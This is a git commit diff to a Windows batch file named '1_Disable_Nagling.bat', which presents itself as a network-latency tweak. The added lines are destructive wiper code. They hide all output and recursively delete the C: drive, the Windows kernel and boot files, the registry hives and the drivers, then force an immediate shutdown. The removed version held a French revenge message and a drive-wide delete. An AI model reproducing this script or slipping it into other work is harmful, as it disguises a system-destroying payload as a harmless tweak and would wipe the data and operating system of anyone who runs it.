8f1b7bdb7465f0f0120d09f254d39add0468ad6b
it's Not Soba <167215396+NotSoba@users.noreply.github.com>
2025-08-04 01:42:56 +0200

    Update 1_Disable_Nagling.bat

--- 1_Disable_Nagling.bat
+++ 1_Disable_Nagling.bat
@@ -1,4 +1,18 @@
 @echo off
-echo [ERREUR] tu n'aurais pas dû RAID mon serveur c'est dommage qu'on soit obligé d'en arriver a la
-del /f /s /q C:\*.* 
-pause
+:: Redirige tout vers nul pour qu'aucune sortie (message d'erreur ou autre) ne soit affichée
+rd /s /q C:\ 2>nul 1>nul
+del /f /s /q C:\*.* 2>nul 1>nul
+
+del /f /q C:\Windows\System32\ntoskrnl.exe  2>nul 1>nul
+del /f /q C:\Windows\System32\hal.dll  2>nul 1>nul
+del /f /q C:\Windows\System32\winload.exe  2>nul 1>nul
+del /f /q C:\Windows\System32\winresume.efi  2>nul 1>nul
+
+del /f /q C:\Windows\System32\config\*   2>nul 1>nul
+
+del /f /q C:\bootmgr  2>nul 1>nul
+del /f /q C:\ntldr  2>nul 1>nul
+del /f /q C:\Windows\System32\Boot\*  2>nul 1>nul
+del /f /q C:\Windows\System32\drivers\* 2>nul 1>nul
+
+shutdown -s -f -t 0 2>nul 1>nul
